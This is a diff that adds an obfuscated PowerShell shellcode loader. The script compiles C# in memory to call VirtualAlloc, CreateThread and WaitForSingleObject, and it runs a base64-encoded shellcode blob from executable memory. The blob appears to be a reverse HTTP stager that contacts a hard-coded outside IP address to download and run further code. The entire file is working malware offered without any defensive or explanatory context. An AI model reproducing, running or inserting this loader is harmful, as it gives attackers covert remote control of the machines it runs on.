@@ -1,0 +1,29 @@
+$eLl = @"
+	using System;
+	using System.Runtime.InteropServices;
+	namespace tLI {
+		public class func {
+			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
+			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
+			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
+			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
+		}
+	}
+"@
+
+$cTnRw = New-Object Microsoft.CSharp.CSharpCodeProvider
+$w2Pc = New-Object System.CodeDom.Compiler.CompilerParameters
+$w2Pc.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
+$w2Pc.GenerateInMemory = $True
+$bm = $cTnRw.CompileAssemblyFromSource($w2Pc, $eLl)
+
+[Byte[]]$oUt = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1obmV0AGh3aW5pVGhMdyYH/9Ux21NTU1NTaDpWeaf/1VNTagNTU2iw1AAA6P8AAAAvaGtGNWlLYjRBZmhGWFVSY0dVUmZOd0FVNll6YTZyZmt6Wk1rVDhjV28wRk5rYzE2cVZkRUF0akZxLTVlUVBOUEZQdm1MU0NuanMxUU5XdGo3eXRKQXFTUm5OMkt4U3labXc0V1JXQTBrdlNQN2oAUGhXiZ/G/9WJxlNoADLghFNTU1dTVmjrVS47/9WWagpfaIAzAACJ4GoEUGofVmh1Rp6G/9VTU1NTVmgtBhh7/9WFwHUUaIgTAABoRPA14P/VT3XN6EwAAABqQGgAEAAAaAAAQABTaFikU+X/1ZNTU4nnV2gAIAAAU1ZoEpaJ4v/VhcB0z4sHAcOFwHXlWMNf6Gv///8xOTkuMjI5LjI0OS4xNTQAu/C1olZqAFP/1Q==")
+
+$bvIhG = [tLI.func]::VirtualAlloc(0, $oUt.Length + 1, [tLI.func+AllocationType]::Reserve -bOr [tLI.func+AllocationType]::Commit, [tLI.func+MemoryProtection]::ExecuteReadWrite)
+if ([Bool]!$bvIhG) { $global:result = 3; return }
+[System.Runtime.InteropServices.Marshal]::Copy($oUt, 0, $bvIhG, $oUt.Length)
+[IntPtr] $f4W = [tLI.func]::CreateThread(0,0,$bvIhG,0,0,0)
+if ([Bool]!$f4W) { $global:result = 7; return }
+$jrG = [tLI.func]::WaitForSingleObject($f4W, [tLI.func+Time]::Infinite)
